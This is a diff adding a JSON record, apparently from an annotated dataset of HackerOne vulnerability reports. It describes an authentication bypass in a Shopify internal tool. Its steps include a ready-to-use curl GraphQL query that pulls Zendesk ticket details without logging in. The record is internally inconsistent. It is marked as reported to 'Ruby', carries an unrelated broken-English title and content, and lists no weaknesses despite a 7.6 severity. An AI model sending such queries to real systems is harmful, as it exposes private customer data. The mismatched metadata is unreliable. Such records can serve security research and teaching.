@@ -1,0 +1,54 @@
+{
+    "reported_to": "Ruby",
+    "reported_by": "sam1166 ",
+    "title": "Provide a security sistem most fit to our team",
+    "content": "\nNow we want to proof that our security sistem is most fit in this year\n\n",
+    "severity": [
+        7.6,
+        null
+    ],
+    "bounty": null,
+    "weaknesses": [
+        "None"
+    ],
+    "screenshots": {},
+    "disclosed_date": 1513365960,
+    "report_url": "https://hackerone.com/reports/281850",
+    "is_multi_component": true,
+    "complexity": "HIGH",
+    "novelty": "HIGH",
+    "vuln_category": "CODE",
+    "steps": [
+        [
+            1,
+            "Observe that athena-flex-production.shopifycloud.com loads momentarily before redirecting to Okta"
+        ],
+        [
+            2,
+            "Using view-source in Chrome, examine the initial page content: view-source:athena-flex-production.shopifycloud.com"
+        ],
+        [
+            3,
+            "Locate the JavaScript source file in the page source: https://cdn.shopifycloud.com/athena-flex/assets/main-3fe2559f5e86bcc7d88fe611b71942faa73e787afbc2126a601662ab254a36fc.js"
+        ],
+        [
+            4,
+            "Beautify and analyze the JS to identify the GraphQL endpoint structure"
+        ],
+        [
+            5,
+            "Send a targeted GraphQL query directly to the endpoint: curl -X POST -H 'Content-Type: application/json' --data-binary '{\"query\": \"query getRecentTicketsQuery($domain: String) { shop(myshopifyDomain: $domain) { zendesk { tickets(last: 5) { edges { node { id requester { name } subject description } } } } } }\",\"variables\":{\"domain\":\"ok.myshopify.com\"}}' 'https://athena-flex-production.shopifycloud.com/graphql'"
+        ],
+        [
+            6,
+            "Receive unrestricted access to Zendesk ticket information in the response"
+        ]
+    ],
+    "vuln_description": "This is an information disclosure and authentication bypass vulnerability in Shopify's internal system (athena-flex-production.shopifycloud.com). Though the site normally redirects users to Okta login, the initial page load exposes JavaScript files before the redirect occurs. By analyzing these JavaScript files, the researcher discovered a GraphQL endpoint that allows unauthenticated access to sensitive Zendesk ticket information.",
+    "reason": "While this vulnerability involves several components - the JS script, GraphQL, zendesk - and the JS file that disclosed the endpoints was part of a complex authentication redirect, but the remainder of the attack was straightforward once the GraphQL endpoint was discovered",
+    "new_complexity": "MEDIUM",
+    "requires_code": false,
+    "requires_CVE": false,
+    "is_ctf": false,
+    "other_report": null
+}
